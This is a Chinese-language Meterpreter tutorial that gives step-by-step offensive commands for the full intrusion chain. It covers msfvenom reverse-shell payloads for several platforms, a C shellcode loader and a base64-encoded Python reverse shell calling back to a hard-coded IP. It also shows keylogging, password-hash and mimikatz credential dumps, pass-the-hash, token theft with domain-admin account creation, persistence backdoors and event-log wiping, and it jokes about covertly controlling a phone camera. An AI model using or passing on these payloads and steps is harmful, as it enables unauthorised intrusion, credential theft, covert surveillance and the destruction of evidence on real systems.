# Meterpreter Guide

由于网上很多文章乱而不全或者过期了 所以打算噜这篇来做个笔记～ 方便自己以后查阅:)

0x01 入门篇(生成与接收)
===============

* * *

功能介绍
----

msfpayload和msfencode已经被时代淘汰了现在都转为msfvenom了

```
msfvenom命令行选项如下：
    Options:
        -p, --payload    payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用'-'或者stdin指定
        -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
        -n, --nopsled    length>        为payload预先指定一个NOP滑动长度
        -f, --format     format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
     -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
        -a, --arch       architecture>  指定payload的目标架构
            --platform   platform>      指定payload的目标平台
        -s, --space      length>        设定有效攻击荷载的最大长度
        -b, --bad-chars  list>          设定规避字符集，比如: '\x00\xff'
        -i, --iterations count>         指定payload的编码次数
        -c, --add-code   path>          指定一个附加的win32 shellcode文件
        -x, --template   path>          指定一个自定义的可执行文件作为模板
        -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
            --payload-options            列举payload的标准选项
        -o, --out   path>               保存payload
        -v, --var-name name>            指定一个自定义的变量，以确定输出格式
        --shellest                   最小化生成payload
        -h, --help                       查看帮助选项
        --help-formats               查看msf支持的输出格式列表

```

### 查看一个Payload具体需要什么参数

```
msfvenom -p windows/meterpreter/bind_tcp --payload-options

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          yes       Exit technique (accepted: seh, thread, process, none)
LPORT     4444             yes       The listen port
RHOST                      no        The target address

```

只示范reverse_tcp 大家可以根据各种不同的环境来选择Payload

**`reverse_http`or`bind_tcp`...**

自己本地生成的bind_tcp的payload并不能在Windows机子上运行 (提示不是可用的Win32程序:(....)

如果大家也有遇到这种错误的话 推荐用msfvenom生成c的shellcode 然后自己编译为exe后运行:)

说不定还有以外的效果哦～

分享一个bind_tcp的栗子 (自行更改shelcode)

```
#include "windows.h"
#include "stdio.h"

typedef void (_stdcall *CODE)();    

unsigned char shellcode[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85\xc0\x75"
"\x50\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1"
"\xff\xd5\x97\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
"\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x07\x01"
"\xc3\x29\xc6\x75\xe9\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff"
"\xd5";

void RunShellCode()  
{  
    ( (void (*)(void))&shellcode )();  
}  


void main()  
{  
    RunShellCode();  
}

```

**具体编码方式和编码次数大家可以自行改变:)**

**使用msfvenom --list可以查看所有的payload encoder nops...哦～～**

### 生成Windows reverse_tcp payload

```
msfvenom -p windows/meterpreter/reverse_tcp -e -i 3 LHOST=172.22.25.51 LPORT=23333 -f exe -o ~/Desktop/shell.exe

```

or

```
msfvenom -p windows/x64/meterpreter_reverse_tcp -e -i 3 LHOST=172.22.25.51 LPORT=23333 -f exe -o ~/Desktop/shell.exe

```

### 生成Python reverse_tcp payload

```
msfvenom -p python/meterpreter/reverse_tcp -e -i 3 LHOST=172.22.25.51  LPORT=23333

```

生成出来的Python是可以直接解码来改IP的端口的 所以可以不用浪费时间生成payload 大家自行更改IP和端口～

```
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxNzIuMjIuMjUuNTEnLDIzMzMzKSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyhkLHsncyc6c30pCg==')))

```

### 生成java payload

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.42.0.1  LPORT=23333 -o ~/Desktop/123.jar

```

### 生成php payload

```
msfvenom -p  php/meterpreter_reverse_tcp LHOST=10.42.0.1  LPORT=23333 -o ~/Desktop/123.php

```

### 生成Linux payload

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.42.0.1  LPORT=23333 -f elf -o ~/Desktop/123.elf

```

### 生成Android的payload :)

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.42.0.1  LPORT=23333 -o ~/Desktop/1234.apk

```

生成后 手机点击app无任何反应 app就默默的后台运行 干啥都行:) so cool!偷偷控制手机摄像头！

![](http://drops.javaweb.org/uploads/images/d7255db507a06d99bb0d6f2b09298e4f75cd5101.jpg)

接收
--

```
msf > use multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp
payload => android/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 23333
LPORT => 23333
msf exploit(handler) > set LHOST 10.42.0.1
LHOST => 10.42.0.1
msf exploit(handler) > exploit

```

0x02 Go on:)
============

* * *

基本命令：
-----

```
background  # 让meterpreter处于后台模式  
sessions -i number   # 与会话进行交互，number表示第n个session  
quit  # 退出会话  
shell # 获得命令行
cat c:\\boot.ini   # 查看文件内容  
getwd # 查看当前工作目录 work directory  
upload /root/Desktop/netcat.exe c:\\ # 上传文件到目标机上  
download 0xfa.txt /root/Desktop/   # 下载文件到本机上  
edit c:\\boot.ini  # 编辑文件  
search -d d:\\www -f web.config # search 文件 
ps # 查看当前活跃进程  
migrate  pid # 将Meterpreter会话移植到进程数位pid的进程中  
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互  
getpid # 获取当前进程的pid  
kill pid # 杀死进程  
getuid # 查看权限  
sysinfo # 查看目标机系统信息，如机器名，操作系统等  
getsystem #提权操作
timestompc:/a.doc -c "10/27/2015 14:22:11" #修改文件的创建时间

```

### 迁移进程

```
meterpreter > ps

```

自行选择PID

```
meterpreter > migrate pid

```

### 提权操作

*   getsystem 大部分都会失败 他只尝试了4个Payload。
    
    ```
    meterpreter > getuid    
    Server username: Testing\Croxy    
    meterpreter > getsystem    
    [-] priv_elevate_getsystem: Operation failed: Access is denied.    
    
    ```
*   使用MS14-058之类的Exp进行提权
    
    ```
    meterpreter > background
    [*] Backgrounding session 3..
    msf exploit(handler) > use exploit/windows/local/ms14_058_track_popup_menu
    msf exploit(ms14_058_track_popup_menu) > set SESSION 3
    
    ```
    
    ![](http://drops.javaweb.org/uploads/images/16a26fbbfb5f9cfe05d81f5a0eb4828add065083.jpg)
    
    再也不用去网上找Exp来下载拉～：）
    

### 获取敏感信息（Windows版本 Linux自行选择）

```
run post/windows/gather/checkvm #是否虚拟机
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run scraper                      #获取常见信息
#保存在～/.msf4/logs/scripts/scraper/目录下

```

详细请参考[http://drops.wooyun.org/tips/9732](http://drops.wooyun.org/tips/9732)

### 键盘记录

```
meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
dir <Return> cd  <Ctrl>  <LCtrl>
meterpreter > keyscan_stop
Stopping the keystroke sniffer...

```

### 网络嗅探

```
meterpreter > use sniffer
Loading extension sniffer...success.
meterpreter > sniffer_interfaces
    1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
    2 - 'Intel(R) PRO/1000 MT Desktop Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )
    3 - 'Cisco Systems VPN Adapter' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )
meterpreter > sniffer_start 2
[*] Capture started on interface 2 (50000 packet buffer)
meterpreter > sniffer_dump 2 /tmp/test2.cap
[*] Flushing packet capture buffer for interface 2...
[*] Flushed 1176 packets (443692 bytes)
[*] Downloaded 100% (443692/443692)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /tmp/test2.cap

```

### 获取Hash

```
meterpreter > run post/windows/gather/smart_hashdump
[*] Running module against TESTING
[*] Hashes will be saved to the database if one is connected.
[*] Hashes will be saved in loot in JtR password file format to:
[*] /home/croxy/.msf4/loot/20150929225044_default_10.0.2.15_windows.hashes_407551.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY 8c2c8d96e92a8ccfc407a1ca48531239...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[+]     Croxy:"Whoareyou"
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
[+]     HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e3f0347f8b369cac49e62a18e34834c0:::
[+]     test123:1003:aad3b435b51404eeaad3b435b51404ee:0687211d2894295829686a18ae83c56d:::

```

### 获取明文密码

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM    

meterpreter > load mimikatz
Loading extension mimikatz...success.
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials    

meterpreter > kerberos
[+] Running as SYSTEM
[*] Retrieving kerberos credentials
kerberos credentials
====================    

meterpreter > mimikatz_command -f samdump::hashes
Ordinateur : Testing
BootKey    : 8c2c8d96e92a8ccfc407a1ca48531239    

meterpreter > mimikatz_command -f sekurlsa::searchPasswords
[0] { Croxy ; Testing ; hehe }
[1] { test ; Testing ; test }

```

### 通过Hash获取权限

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > show options    

Module options (exploit/windows/smb/psexec):    

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
RHOST                       yes       The target address
RPORT      445              yes       Set the SMB service port
SHARE      ADMIN$           yes       The share to connect to, can be an admi                                              n share

(ADMIN$,C$,...) or a normal read/write folder share
SMBDomain  WORKGROUP        no        The Windows domain to use for authentic                                                ation
SMBPass                     no        The password for the specified username
SMBUser                     no        The username to authenticate as    

Exploit target:    

Id  Name
--  ----
0   Automatic    

msf exploit(psexec) > set RHOST 192.168.0.254
RHOST => 192.168.0.254
msf exploit(psexec) > set SMBUser isosky
SMBUser => isosky
msf exploit(psexec) > set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537    

SMBPass => 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537
msf exploit(psexec) > exploit
[*] Started reverse handler on 192.168.0.3:4444
[*] Connecting to the server...
[*] Authenticating to 192.168.0.254:445|WORKGROUP as user 'isosky'...
[*] Uploading payload...
[*] Created \UGdecsam.exe...
[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ...
[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ...
[*] Obtaining a service manager handle...
[*] Creating a new service (MZsCnzjn - "MrZdoQwIlbBIYZQJyumxYX")...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \UGdecsam.exe...
[*] Sending stage (749056 bytes) to 192.168.0.254
[*] Meterpreter session 1 opened (192.168.0.3:4444 -> 192.168.0.254:1877) at 2011-07-19 03:57:17 +0800

```

0x03 内网渗透
=========

* * *

**10.42.0.54为target**

端口转发
----

```
meterpreter > portfwd add -l 1234 -p 3389 -r 10.42.0.54
[*] Local TCP relay created: 0.0.0.0:8081 <-> 10.42.0.54:80

```

将远程主机3389端口转发到本地1234端口上

内网代理
----

### Windows

```
meterpreter > run autoroute -s 10.42.0`.54
[*] Adding a route to 10.42.0.54/255.255.255.0...
[+] Added route to 10.42.0.54/255.255.255.0 via 10.42.0.54
[*] Use the -p option to list all active routes
meterpreter > background
[*] Backgrounding session 1...
msf exploit(handler) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options    

Module options (auxiliary/server/socks4a):
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
SRVHOST  0.0.0.0          yes       The address to listen on
SRVPORT  1080             yes       The port to listen on.    

Auxiliary action:
Name   Description
----   -----------
Proxy      

msf auxiliary(socks4a) > route print
Active Routing Table
====================
Subnet             Netmask            Gateway
------             -------            -------
10.42.0.54         255.255.255.0      Session 1    

msf auxiliary(socks4a) > ifconfig
[*] exec: ifconfig    

msf auxiliary(socks4a) > set SRVHOST xxx.xxx.xx.xx
SRVHOST => xxx.xxx.xx.xx (xxx.xxx.xx.xx为自己运行msf的vps机子)    

msf auxiliary(socks4a) > exploit
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server

```

之后使用proxychains 设置socks4代理 链接vps上的1080端口 就可以访问内网了

### SSH代理

```
msf > load meta_ssh
msf > use multi/ssh/login_password
msf > set RHOST 192.168.56.3
RHOST => 192.168.56.3
msf > set USER test
USER => test
msf > set PASS reverse
PASS => reverse
msf > set PAYLOAD ssh/metassh_session
PAYLOAD => ssh/metassh_session
msf > exploit -z
[*] Connecting to dsl@192.168.56.3:22 with password reverse
[*] metaSSH session 1 opened (127.0.0.1 -> 192.168.56.3:22) at 2011-12-28   03:51:16 +1300
[*] Session 1 created in the background.
msf > route add 192.168.57.0 255.255.255.0 1

```

之后就是愉快的内网扫描了

当然还是推荐直接用

```
ssh -f -N -D 127.0.0.1:6666 test@103.224.81.1.1

```

### 偷取Token

```
meterpreter>ps #查看目标机器进程，找出域控账户运行的进程ID
meterpreter>steal_token pid

```

方法2

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load incognito
Loading extension incognito...success.
meterpreter > list_tokens -u    

Delegation Tokens Available
========================================
IIS APPPOOL\zyk
NT AUTHORITY\IUSR
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
QLWEB\Administrator    

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON    

meterpreter > impersonate_token QLWEB\\Administrator
[+] Delegation token available
[+] Successfully impersonated user QLWEB\Administrator
meterpreter > getuid
Server username: QLWEB\Administrator
meterpreter>add_user 0xfa funny –h192.168.3.98  #在域控主机上添加账户
meterpreter>add_group_user “DomainAdmins” 0xfa –h192.168.3.98   #将账户添加至域管理员组

```

如果有了域控:) nidongde

### 内网扫描

```
meterpreter > run autoroute -s 192.168.3.98
meterpreter > background
[*] Backgrounding session 2...
msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set PORTS 80,8080,21,22,3389,445,1433,3306
PORTS => 80,8080,21,22,3389,445,1433,3306
msf auxiliary(tcp) > set RHOSTS 192.168.3.1/24
RHOSTS => 192.168.3.1/24
msf auxiliary(tcp) > set THERADS 10
THERADS => 10
msf auxiliary(tcp) > exploit

```

![](http://drops.javaweb.org/uploads/images/0bb4eb7cf225fdebbf0a42610511e793ac903099.jpg)

我还是推荐开代理用Nmap扫描>.<

一些常用的破解模块

```
auxiliary/scanner/mssql/mssql_login
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/ssh/ssh_login
auxiliary/scanner/telnet/telnet_login
auxiliary/scanner/smb/smb_login
auxiliary/scanner/mssql/mssql_login
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/oracle/oracle_login
auxiliary/scanner/postgres/postgres_login
auxiliary/scanner/vnc/vnc_login
auxiliary/scanner/pcanywhere/pcanywhere_login
auxiliary/scanner/snmp/snmp_login
auxiliary/scanner/ftp/anonymous

```

![](http://drops.javaweb.org/uploads/images/64657f444dd24e844a0dc44b1da73ebe4114c122.jpg)

一些好用的模块

```
auxiliary/admin/realvnc_41_bypass  (Bypass VNCV4网上也有利用工具)
auxiliary/admin/cisco/cisco_secure_acs_bypass （cisco Bypass 版本5.1或者未打补丁5.2版 洞略老）
auxiliary/admin/http/jboss_deploymentfilerepository （内网遇到Jboss最爱:)）
auxiliary/admin/http/dlink_dir_300_600_exec_noauth (Dlink 命令执行:)
auxiliary/admin/mssql/mssql_exec （用爆破得到的sa弱口令进行执行命令 没回显:(）
auxiliary/scanner/http/jboss_vulnscan (Jboss 内网渗透的好朋友)
auxiliary/admin/mysql/mysql_sql (用爆破得到的弱口令执行sql语句:)
auxiliary/admin/oracle/post_exploitation/win32exec （爆破得到Oracle弱口令来Win32命令执行）
auxiliary/admin/postgres/postgres_sql (爆破得到的postgres用户来执行sql语句)

```

还一些。。。。你懂的脚本 ：）

```
auxiliary/scanner/rsync/modules_list  （Rsync）
auxiliary/scanner/misc/redis_server  (Redis)
auxiliary/scanner/ssl/openssl_heartbleed (心脏滴血)
auxiliary/scanner/mongodb/mongodb_login (Mongodb)
auxiliary/scanner/elasticsearch/indices_enum (elasticsearch)
auxiliary/scanner/http/axis_local_file_include (axis本地文件包含)
auxiliary/scanner/http/http_put (http Put)
auxiliary/scanner/http/gitlab_user_enum (获取内网gitlab用户)
auxiliary/scanner/http/jenkins_enum (获取内网jenkins用户)
auxiliary/scanner/http/svn_scanner （svn Hunter :)）
auxiliary/scanner/http/tomcat_mgr_login (Tomcat 爆破)
auxiliary/scanner/http/zabbix_login （Zabbix :)）

```

0x04 AfterWards?
================

* * *

### 后门:)

```
一个vbs后门 写入了开机启动项 但是容易被发现 还是需要大家发挥自己的智慧:)    

meterpreter > run persistence -X -i 5 -p 23333 -r 10.42.0.1
[*] Running Persistance Script
[*] Resource file for cleanup created at /home/croxy/.msf4/logs/persistence/TESTING_20150930.3914/TESTING_20150930.3914.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333
[*] Persistent agent script is 148453 bytes long
[+] Persistent Script written to C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs
[*] Executing script C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs
[+] Agent executed with PID 4140
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr

```

Meterpreter服务后门

```
meterpreter > run metsvc
[*] Creating a meterpreter service on port 31337
[*] Creating a temporary installation directory C:\Users\Croxy\AppData\Local\Temp\tuIKWqmuO...
[*]  >> Uploading metsrv.x86.dll...
[*]  >> Uploading metsvc-server.exe...
[*]  >> Uploading metsvc.exe...
[*] Starting the service...
* Installing service metsvc
* Starting service
* Service metsvc successfully installed.

```

之后电脑就默默生成了一个自启服务Meterpreter

然后连接后门

```
msf exploit(handler) > use exploit/multi/handler
msf exploit(handler) > set payload windows/metsvc_bind_tcp
payload => windows/metsvc_bind_tcp
msf exploit(handler) > set RHOST 10.42.0.54
RHOST => 10.42.0.54
msf exploit(handler) > set LPORT 31337
LPORT => 31337
msf exploit(handler) > exploit

```

#### 清理痕迹:)

```
meterpreter > clearev
[*] Wiping 12348 records from Application...
[*] Wiping 1345 records from System...
[*] Wiping 3 records from Security...

```

0x05 And So On...
=================

* * *

Look it

[Tree](http://www.c-chicken.cc/msf.txt)

Meterpreter太强大～

待续补充完整：）

不足请见谅:)

Thanks:

*   [http://drops.wooyun.org/tips/24](http://drops.wooyun.org/tips/24)
*   [http://drops.wooyun.org/tips/5234](http://drops.wooyun.org/tips/5234)